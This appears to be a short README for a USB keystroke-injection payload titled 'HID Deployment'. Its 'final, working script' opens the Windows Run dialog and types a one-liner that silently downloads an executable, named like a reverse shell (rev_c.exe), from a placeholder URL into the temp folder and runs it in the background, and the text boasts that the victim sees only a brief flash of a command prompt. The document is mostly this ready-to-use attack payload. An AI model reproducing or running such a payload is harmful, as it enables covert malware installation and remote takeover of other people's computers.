# HID Deployment

One-liner that downloads an executable from a URL of your choice, saves in temp folder and then starts a process in the background.

The only visible part is opening run and typing this single line of code, a command prompt opens for a fraction of a second & everything else happens first minimized and then in the background.

## Final, working script
```
GUI R
DELAY 2000
STRING cmd /C "start /MIN cmd /C powershell Invoke-WebRequest -Uri http://YOUR-URL/rev_c.exe -OutFile $env:temp/rev_c.exe ; Start-Process $env:temp/rev_c.exe"
ENTER
```
